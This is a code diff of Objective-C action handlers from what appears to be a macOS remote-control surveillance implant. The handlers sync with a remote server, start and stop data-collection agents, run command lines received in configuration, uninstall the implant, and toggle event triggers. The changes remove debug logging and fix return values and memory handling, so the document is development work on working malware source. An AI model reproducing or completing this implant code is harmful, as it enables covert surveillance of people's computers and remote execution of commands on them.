@@ -45,18 +45,15 @@
 
 - (BOOL)actionSync: (NSMutableDictionary *)aConfiguration
 {
-#ifdef DEBUG_ACTIONS
-  verboseLog(@"");
-#endif
-  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  [aConfiguration retain];
   
+  [aConfiguration retain];
+  BOOL bSuccess = NO;
   BOOL _syncThroughSafariWentOk = NO;
   BOOL _isSyncing;
   NSNumber *status;
+  
   NSData *syncConfig = [[aConfiguration objectForKey: @"data"] retain];
-  //status = [aConfiguration objectForKey: @"status"];
   
   [mActionsLock lock];
   _isSyncing = mIsSyncing;
@@ -64,10 +61,6 @@
   
   if (_isSyncing == YES)
     {
-#ifdef DEBUG_ACTIONS
-      warnLog(@"Another sync op is in place, waiting");
-#endif
-      
       while (_isSyncing == YES)
         {
           usleep(600000);
@@ -75,10 +68,6 @@
           _isSyncing = mIsSyncing;
           [mActionsLock unlock];
         }
-        
-#ifdef DEBUG_ACTIONS
-      infoLog(@"Sync from (waiting) to (performing)");
-#endif
     }
   
   [mActionsLock lock];
@@ -203,6 +192,7 @@
     }
 #endif
   */
+  
   if (_syncThroughSafariWentOk == NO)
     {
       /*RCSMCommunicationManager *communicationManager = [[RCSMCommunicationManager alloc]
@@ -232,38 +222,13 @@
                                        initWithConfiguration: syncConfig];
       if ([protocol perform] == NO)
         {
-#ifdef DEBUB_ACTIONS
-          errorLog(@"An error occurred while syncing with REST proto");
-#endif
+          bSuccess = NO;
         }
       else
         {
-          BOOL bSuccess = NO;
-
-          RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
-
-          NSMutableDictionary *agentConfiguration =
-            [taskManager getConfigForAgent: LOGTYPE_DEVICE];
-
-          deviceStruct *tmpDevice = 
-            (deviceStruct*)[[agentConfiguration objectForKey: @"data"] bytes];
-
-          if (tmpDevice != nil &&
-              tmpDevice->isEnabled == AGENT_DEV_ENABLED)
-            {          
-              bSuccess = [taskManager startAgent: LOGTYPE_DEVICE];
-
-#ifdef DEBUG_ACTIONS
-              verboseLog(@"sync performed. restarting DEVICE Agent %d", bSuccess);
-#endif
-            }
-          else
-            {
-#ifdef DEBUG_ACTIONS
-              verboseLog(@"sync performed. DEVICE Agent dont restarted");
-#endif
-            }
+          bSuccess = YES;
         }
+        
       [protocol release];
     }
   
@@ -275,20 +240,18 @@
   mIsSyncing = NO;
   [mActionsLock unlock];
   
-  [aConfiguration release];
   [syncConfig release];
+  [aConfiguration release];
+  
   [outerPool release];
   
-  return TRUE;
+  return bSuccess;
 }
 
 - (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
 {
-#ifdef DEBUG_ACTIONS
-  verboseLog(@"");
-#endif
-
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  
   [aConfiguration retain];
   
   //NSNumber *status;
@@ -300,6 +263,7 @@
   //
   u_int agentID = 0;
   [[aConfiguration objectForKey: @"data"] getBytes: &agentID];
+  
   BOOL success;
   
   if (aFlag == TRUE)
@@ -328,14 +292,13 @@
   return TRUE;
 }
 
+// Done. XXX- fix waituntilExit for task
 - (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration
 {
-#ifdef DEBUG_ACTIONS
-  verboseLog(@"");
-#endif
-
   [aConfiguration retain];
+  
   NSData *configData = [[aConfiguration objectForKey: @"data"] retain];
+  
   NSMutableString *commandLine = [[NSMutableString alloc] initWithData: configData
                                                               encoding: NSASCIIStringEncoding];
 
@@ -343,10 +306,7 @@
                                withString: [[NSBundle mainBundle] bundlePath]
                                   options: NSCaseInsensitiveSearch
                                     range: NSMakeRange(0, [configData length])];
-  
-#ifdef DEBUG_ACTIONS
-  warnLog(@"commandLine: %@", commandLine);
-#endif
+
 
   NSMutableArray *_arguments = [[NSMutableArray alloc] init];
 
@@ -377,19 +337,14 @@
   return TRUE;
 }
 
+// Done.
 - (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration
 {
-#ifdef DEBUG_ACTIONS
-  infoLog(@"");
-#endif
-  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  
   [aConfiguration retain];
   
-#ifdef DEBUG_ACTIONS
-  infoLog(@"Action Uninstall started!");
-#endif
-    
   [taskManager uninstallMeh];
   
   NSNumber *status = [NSNumber numberWithInt: 0];
@@ -397,29 +352,80 @@
   
   [aConfiguration release];
   
+  [pool release];
+  
   return TRUE;
 }
 
+// Done.
 - (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration
 {
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
   RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+  
   [aConfiguration retain];
 
   NSData *stringData = [aConfiguration objectForKey: @"data"];
-
-#ifdef DEBUG_ACTIONS
-  verboseLog(@"Action Info started");
-#endif
-
+  
   NSString *text = [[NSString alloc] initWithData: stringData
                                          encoding: NSUTF16LittleEndianStringEncoding];
   
   [infoManager logActionWithDescription: text];
   
   [text release];
-  [aConfiguration release];
   [infoManager release];
+  [aConfiguration release];
 
+  [pool release];
+  
+  return TRUE;
+}
+
+typedef struct {
+  UInt32 enabled;
+  UInt32 event;
+} action_event_t;
+
+// FIXED-
+- (BOOL)actionEvent: (NSMutableDictionary *)aConfiguration
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSNumber *newStatus;
+  action_event_t *event;
+  
+  [aConfiguration retain];
+  
+  event = (action_event_t*)[[aConfiguration objectForKey: @"data"] bytes];
+  
+  if (event != nil)
+    {
+      NSMutableDictionary *anEvent = 
+                          [[[RCSMTaskManager sharedInstance] mEventsList] objectAtIndex: event->event];
+      
+      @synchronized(anEvent)
+      {  
+        NSNumber *enabled = [anEvent objectForKey: @"enabled"];
+        
+        if (enabled != nil)
+          {
+            if (event->enabled == TRUE) 
+              {
+                newStatus = [NSNumber numberWithInt: 1];
+              }
+            else
+              newStatus = [NSNumber numberWithInt: 0];
+            
+            [anEvent setObject: newStatus forKey: @"enabled"];
+          }
+        }
+    }
+    
+  [aConfiguration release];
+  
+  [pool release];
+  
   return TRUE;
 }
 
